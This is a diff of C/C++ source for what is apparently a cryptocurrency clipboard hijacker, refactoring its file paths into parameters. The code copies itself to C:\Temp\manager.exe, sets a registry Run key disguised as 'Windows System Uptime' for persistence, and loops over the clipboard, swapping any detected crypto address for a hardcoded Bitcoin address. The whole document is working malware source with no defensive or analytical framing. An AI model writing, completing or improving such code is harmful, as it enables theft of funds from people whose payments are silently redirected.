@@ -41,32 +41,33 @@ bool validateAddress(char *address) {
     }
 }
 
-void addStartup() {
-    const char path[] = "C:\\Temp\\manager.exe";
+void addStartup(const char save_path[]) {
     HKEY hKey;
     LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
     if( ERROR_SUCCESS == lnRes ) {
-        lnRes = RegSetValueEx(hKey, "Windows System Uptime", 0, REG_SZ, (BYTE*) path, strlen(path));
+        lnRes = RegSetValueEx(hKey, "Windows System Uptime", 0, REG_SZ, (BYTE*) save_path, strlen(save_path));
         RegCloseKey(hKey);
     }
 }
 
 
-void copy_self(char* filename) {
-    CreateDirectory("C:\\Temp\\", NULL);
-    if (filesystem::exists("C:\\Temp\\manager.exe")) {
+void copy_self(char* filename, char save_path[], char create_path[]) {
+    CreateDirectory(create_path, NULL);
+    if (filesystem::exists(save_path)) {
         return; 
     }
     else {
-        CopyFile(filename, "C:\\Temp\\manager.exe", FALSE);
+        CopyFile(filename, save_path, FALSE);
     }
     
 }
 
 int main(int argc, char *argv[]) {
+    char create_path[] = "C:\\Temp\\";
+    char save_path[] = "C:\\Temp\\manager.exe";
     char address[] = "bc1qlkt252pj7z4nfsq48maejm6k9054jsp5ulxz72";
-    copy_self(argv[0]);
-    addStartup();
+    copy_self(argv[0], save_path, create_path);
+    addStartup(save_path);
     for ( ; ; ) {
         if (validateAddress(getClipboard())) {
             setClipboard(address);
